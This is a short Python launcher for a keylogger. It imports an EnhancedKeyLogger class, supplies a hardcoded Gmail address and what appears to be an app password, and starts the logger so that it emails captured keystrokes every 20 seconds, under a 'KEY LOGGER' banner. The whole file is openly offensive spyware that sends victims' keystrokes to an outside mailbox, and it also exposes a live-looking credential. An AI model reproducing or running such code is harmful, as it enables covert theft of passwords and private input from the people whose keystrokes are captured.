import pyfiglet
from keywatch.keylogger import EnhancedKeyLogger

# Provide your Gmail address and App Password
EMAIL_ADDRESS = "tryhackmail00@gmail.com"
EMAIL_PASSWORD = "maalsclaflstlwjw"  # Replace with your App Password
REPORT_INTERVAL = 20  # Default Time interval in seconds for sending email reports

def main():
    try:
        keylogger = EnhancedKeyLogger(
            email=EMAIL_ADDRESS,
            password=EMAIL_PASSWORD,
            interval=REPORT_INTERVAL
        )
        print("[+] Keylogger started successfully. Listening for keystrokes...")
        keylogger.start()
    except Exception as error:
        print(f"[!] Failed to start keylogger: {error}")

if __name__ == "__main__":
    banner = pyfiglet.print_figlet("\nKEY LOGGER\n")
    main()
